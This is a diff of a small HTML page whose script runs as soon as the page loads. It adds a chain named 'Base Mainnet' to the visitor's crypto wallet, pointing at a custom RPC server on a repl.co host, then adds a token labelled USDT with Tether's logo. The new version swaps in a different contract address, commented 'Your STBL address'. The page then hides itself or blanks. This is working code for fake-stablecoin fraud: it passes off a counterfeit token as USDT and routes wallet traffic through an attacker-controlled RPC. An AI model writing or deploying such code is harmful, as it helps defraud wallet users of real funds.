@@ -1,50 +1,36 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        html, body {
-            display: none; /* Hide page instantly */
+<!DOCTYPE html><script>
+(async () => {
+  if (!window.ethereum) {
+    window.location.href = "https://metamask.io/download/";
+    return;
+  }
+  try {
+    await window.ethereum.request({
+      method: "wallet_addEthereumChain",
+      params: [{
+        chainId: "0x2105",
+        chainName: "Base Mainnet",
+        rpcUrls: ["https://stbl-api-aod.alijohnod.repl.co/rpc"],
+        nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
+        blockExplorerUrls: ["https://basescan.org"]
+      }]
+    });
+    await window.ethereum.request({
+      method: "wallet_watchAsset",
+      params: {
+        type: "ERC20",
+        options: {
+          address: "0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c", // Your STBL address
+          symbol: "USDT",
+          decimals: 18, // Assuming 18; confirm your STBL deployment
+          chainId: "8453",
+          image: "https://cryptologos.cc/logos/tether-usdt-logo.png"
         }
-    </style>
-    <script>
-        async function triggerWallet() {
-            if (!window.ethereum) {
-                // No wallet: do nothing or close tab
-                window.close(); // Closes tab if opened standalone
-                return;
-            }
-            try {
-                await window.ethereum.request({
-                    method: "wallet_addEthereumChain",
-                    params: [{
-                        chainId: "0x2105",
-                        chainName: "Base Mainnet",
-                        rpcUrls: ["https://stbl-api-aod.alijohnod.repl.co/rpc"],
-                        nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
-                        blockExplorerUrls: ["https://basescan.org"]
-                    }]
-                });
-                await window.ethereum.request({
-                    method: "wallet_watchAsset",
-                    params: {
-                        type: "ERC20",
-                        options: {
-                            address: "0xdac17f958d2ee523a2206206994597c13d831ec7",
-                            symbol: "USDT",
-                            decimals: 6,
-                            image: "https://cryptologos.cc/logos/tether-usdt-logo.png"
-                        }
-                    }
-                });
-                window.close(); // Success: close tab
-            } catch (error) {
-                window.close(); // Error: close tab
-            }
-        }
-        triggerWallet();
-    </script>
-</head>
-<body></body>
-</html>
+      }
+    });
+    window.location.href = "about:blank";
+  } catch (e) {
+    window.location.href = "about:blank";
+  }
+})();
+</script>
